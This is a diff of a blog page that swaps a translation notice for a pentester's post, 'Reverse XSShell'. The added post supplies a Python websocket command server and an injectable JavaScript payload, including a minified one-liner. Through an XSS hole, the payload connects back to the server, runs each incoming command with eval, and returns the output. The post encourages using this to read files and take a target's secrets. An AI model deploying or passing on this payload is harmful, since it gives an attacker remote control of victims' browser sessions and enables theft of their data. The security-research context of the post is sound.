@@ -17,21 +17,21 @@
     
     
 
-<title>Infosec made easy • Think
+<title>Reverse XSShell • Think
 Love
 Share</title>
 
 
 <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Infosec made easy"/>
-<meta name="twitter:description" content="I often end up speaking about infosec with friends that don&#39;t know much about this topic, and it can be a lot to handle at once, many complicated words, techniques, etc. So here&#39;s a glossary of the main attacks, but with weird descriptions!"/>
+<meta name="twitter:title" content="Reverse XSShell"/>
+<meta name="twitter:description" content="Having some fun playing with xss and websockets. A different approach to reverse shell and their contexts!"/>
 
-<meta property="og:title" content="Infosec made easy" />
-<meta property="og:description" content="I often end up speaking about infosec with friends that don&#39;t know much about this topic, and it can be a lot to handle at once, many complicated words, techniques, etc. So here&#39;s a glossary of the main attacks, but with weird descriptions!" />
+<meta property="og:title" content="Reverse XSShell" />
+<meta property="og:description" content="Having some fun playing with xss and websockets. A different approach to reverse shell and their contexts!" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://thinkloveshare.github.io/en/hacking/infosec_made_easy/" />
-<meta property="article:published_time" content="2020-02-03T00:00:00+00:00" />
-<meta property="article:modified_time" content="2020-02-03T00:00:00+00:00" />
+<meta property="og:url" content="https://thinkloveshare.github.io/en/hacking/reverse_xsshell/" />
+<meta property="article:published_time" content="2020-02-22T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-02-22T00:00:00+00:00" />
 
 
     
@@ -174,9 +174,9 @@ Share</a>
     </p>
     <div class="langSection">
     
-    <a rel="alternate" href="/en/hacking/infosec_made_easy/" hreflang="en" lang="en"><img src="/img/flag_en.png" alt="flag_en" class="logoFlag"/></a>
+    <a rel="alternate" href="/en/hacking/reverse_xsshell/" hreflang="en" lang="en"><img src="/img/flag_en.png" alt="flag_en" class="logoFlag"/></a>
     
-    <a rel="alternate" href="/fr/hacking/infosec_made_easy/" hreflang="fr" lang="fr"><img src="/img/flag_fr.png" alt="flag_fr" class="logoFlag"/></a>
+    <a rel="alternate" href="/fr/hacking/reverse_xsshell/" hreflang="fr" lang="fr"><img src="/img/flag_fr.png" alt="flag_fr" class="logoFlag"/></a>
     </div>
     <p class="copyright">
       &copy; 2020 Laluka.
@@ -192,16 +192,16 @@ Share</a>
             
     <article>
   <header>
-    <h1>Infosec made easy</h1>
+    <h1>Reverse XSShell</h1>
     
     
 <div class="post__meta">
     
-      <i class="fas fa-calendar-alt"></i> Feb 3, 2020
+      <i class="fas fa-calendar-alt"></i> Feb 22, 2020
     
     
-    <i class="fas fa-clock"></i> 1 min read
-    <i class="fas fa-globe"></i> translated<br/>
+    <i class="fas fa-clock"></i> 2 min read
+    <i class="fas fa-globe"></i> original<br/>
     <i class="fas fa-heart"></i>
     
     Any typos? Any idea to suggest? Feedback appreciated!
@@ -214,34 +214,103 @@ Share</a>
   <div class="post">
     
 
-<h1 id="not-translated-because-i-m-lazy-af">Not translated, because I&rsquo;m lazy af! :]</h1>
+<h1 id="the-initial-idea">The initial idea</h1>
+
+<p>While auditing a website, I found out they were using websockets to transmit data. I didn&rsquo;t knew much about it so I had to <a href="https://rtfm.re/">ReadTheFancyManual</a>. Once I understook that it was&hellip; Well&hellip; A socket one could use with web technologies, I asked myself &ldquo;What do I usually do with sockets?&rdquo;</p>
+
+<p>Tunnels! Transfer files! Or&hellip; Spawn reverse shells?!</p>
+
+<p>Or&hellip; Spawn a reverse XSShell??</p>
+
+<h1 id="what-do-we-need">What do we need?</h1>
+
+<h2 id="a-websocket-server">A websocket server</h2>
+
+<pre><code class="language-python">import asyncio
+import websockets
+
+
+async def hello(websocket, path):
+    print(&quot;WebSocket received&quot;)
+
+    while True:
+        cmd = input(&quot;cmd &gt; &quot;)
+        await websocket.send(cmd)
+        print(f&quot;sent: {cmd}&quot;)
+
+        out = await websocket.recv()
+        print(f&quot;out : {out}\n&quot;)
+
+start_server = websockets.serve(hello, &quot;localhost&quot;, 8080)
+
+asyncio.get_event_loop().run_until_complete(start_server)
+asyncio.get_event_loop().run_forever()
+</code></pre>
+
+<h2 id="some-javascript-to-connect-back">Some javascript to connect back</h2>
 
 <ul>
-<li>Original (french) here : <a href="https://thinkloveshare.github.io/fr/hacking/infosec_made_easy/">Infosec made easy</a></li>
-<li>Translator here : <a href="https://www.deepl.com/translator">Deepl translator</a></li>
+<li><p>Readable version</p>
+
+<pre><code class="language-javascript">var socket = new WebSocket(&quot;ws://localhost:8080/&quot;);
+
+socket.onopen = function() {
+console.log(&quot;Connected!&quot;);
+};
+
+socket.onmessage = function(event) {
+console.log(&quot;Cmd received&quot;, event.data);
+socket.send(eval(event.data));
+// socket.close();
+};
+</code></pre></li>
+
+<li><p>Actual payload I use</p>
+
+<pre><code class="language-javascript">s=new WebSocket(&quot;ws://localhost:8080/&quot;),s.onmessage=function(ev){try{s.send(eval(ev.data))}catch(e){s.send(e)}};
+</code></pre></li>
 </ul>
 
+<h2 id="an-html-page-to-execute-the-payload">An html page to execute the payload</h2>
+
 <blockquote>
-<p>No, more seriously, having to translate (localize) and format all the articles in two languages takes a huge amount of time that completely demotivates me to write new articles, that&rsquo;s why some of them are no longer translated. There will be French or English editions depending on the targeted audience, and if you ever feel like a translator&hellip; Hit me up?
-Kisses and have a nice day, <br />
-- Laluka</p>
+<p>Who cares about html anyway?</p>
 </blockquote>
+
+<h2 id="in-short">In short</h2>
+
+<p>The code can be found here : <a href="https://gitlab.com/TheLaluka/ctf_utils/-/tree/master/web/websocket_xss">https://gitlab.com/TheLaluka/ctf_utils/-/tree/master/web/websocket_xss</a></p>
+
+<p>And what this gives us is a reverse shell in a javascript (browser / renderer) context. What you can do from here is up to you.. Try to read files, query the network, mess with your target&rsquo;s DOM or secrets&hellip; Have fun ! :)</p>
+
+<h1 id="demo">Demo</h1>
+
+<p><img class="img_big" src="/hacking/reverse_xsshell/demo.png" alt="demo"></p>
+
+<h1 id="limitations">Limitations</h1>
+
+<ul>
+<li>You still need an xss little restrictions (use eval, long payload, &hellip;)</li>
+<li>The reverse xsshell can be blocked on its way back by a firewall / proxy / SOP / CSP / &hellip;</li>
+<li>Blocking actions (alert, prompt, redirect, &hellip;) will break the current shell (trig xss again!)</li>
+</ul>
+
+<h1 id="appendix">Appendix</h1>
+
+<p>Once again, after spending some time playing arount with a new idea, I start googling it and&hellip; Well, it&rsquo;s not <em>really</em> something new. It&rsquo;s just about re-discovering <a href="https://github.com/raz-varren/xsshell">what others found before</a>. That being said, I love one-liners and keeping things as simple as possible, so it&rsquo;s not the same-same.. :)</p>
+
+<p><img class="img_big" src="/hacking/reverse_xsshell/same_but_different.gif" alt="same_but_different"></p>
 
   </div>
   
 
 <div class="post--navigation post--navigation-single">
     
-    <a href="/en/hacking/wordpress_subpath_auditor/" class="post--navigation-prev">
+    <a href="/en/hacking/infosec_made_easy/" class="post--navigation-prev">
       <i aria-hidden="true" class="fa fa-chevron-left"></i>
-      <span class="navigation-tittle">Wordpress Subpath Auditor</span>
+      <span class="navigation-tittle">Infosec made easy</span>
     </a>
     
-    
-    <a href="/en/hacking/reverse_xsshell/" class="post--navigation-next">
-      <span class="navigation-tittle">Reverse XSShell</span>
-      <i aria-hidden="true" class="fa fa-chevron-right"></i>
-    </a>
     
 </div>
 
